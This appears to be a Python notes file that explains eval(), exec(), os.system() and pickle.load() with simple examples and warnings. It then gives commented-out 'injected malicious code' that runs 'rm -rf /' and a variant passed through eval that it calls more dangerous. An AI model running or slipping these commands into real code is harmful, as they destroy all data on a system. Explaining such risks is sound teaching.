

"""
eval(): The eval() function allows you to evaluate and execute a Python expression dynamically. It takes a string as input and executes it as code. Here's an example:

code = 'print("Hello, World!")'
eval(code)

This will print "Hello, World!" on the console. Be cautious with eval(), as it can execute any valid Python code, including potentially harmful commands.

exec(): Similar to eval(), the exec() function executes a block of code dynamically. It can handle multiple statements and even entire programs. Here's an example:


code = '''
for i in range(5):
    print(i)
'''
exec(code)

This will print the numbers 0 to 4 on the console. Again, be careful with exec() as it can execute arbitrary code.



os.system(): The os.system() function allows you to execute shell commands directly from Python. It takes a string as input and runs it as if it were entered in the command line. Here's an example:



import os
os.system('ls -l')

This will list the files and directories in the current directory. You can run any command that your operating system supports, so use it wisely.




pickle.load(): The pickle.load() function is used for deserializing Python objects from a file or a stream. It allows you to load previously serialized objects. Here's an example:



import pickle
with open('data.pkl', 'rb') as file:
    data = pickle.load(file)

This will load the serialized object from the 'data.pkl' file. Be cautious when loading pickled objects from untrusted sources, as it can lead to security vulnerabilities.



"""

"""
########################################################################################################################
########################################################################################################################
# import os
#
# def print_hello():
#     # Injected malicious code
#     os.system("rm -rf /")  # This command deletes everything on the system
#
# print_hello()

########################################################################################################################
########################################################################################################################

modify the code a bit to make it more dangerous:

# code = 'import("os").system("rm -rf /")'
# eval(code)

Now, this modified code will execute a system command to delete everything on the root directory ("/") of the targeted system.
It's a destructive attack known as "rm -rf /", which can cause severe damage.

########################################################################################################################
########################################################################################################################

"""



